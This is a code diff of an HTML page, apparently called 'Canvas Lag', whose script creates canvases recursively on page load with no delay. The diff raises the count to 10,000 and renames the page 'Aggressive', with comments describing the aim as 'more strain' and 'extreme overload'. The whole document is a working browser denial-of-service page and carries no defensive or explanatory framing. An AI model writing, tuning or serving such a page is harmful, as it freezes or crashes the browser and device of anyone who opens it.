@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Canvas Lag - Faster</title>
+  <title>Canvas Lag - Aggressive</title>
 </head>
 <body>
 <script>
@@ -9,18 +9,20 @@ function overloadCanvas() {
     let counter = 0;
 
     function createCanvas() {
+        // Create a large number of canvases with smaller sizes for faster creation
         const canvas = document.createElement('canvas');
-        canvas.width = 10000;  // Decreased size for faster performance
-        canvas.height = 10000;  // Decreased size for faster performance
+        canvas.width = 500;  // Small canvas size for faster creation
+        canvas.height = 500;
         document.body.appendChild(canvas);
 
+        // Increase the number of canvases to create more strain
         counter++;
-        if (counter < 5000) {  // Increased number of canvases
-            createCanvas();  // Create canvases immediately without timeout
+        if (counter < 10000) {  // Increase to a larger number for extreme overload
+            createCanvas();  // Immediately call again without delay
         }
     }
 
-    createCanvas();  // Start the canvas creation
+    createCanvas();  // Start the canvas creation loop
 }
 
 overloadCanvas();
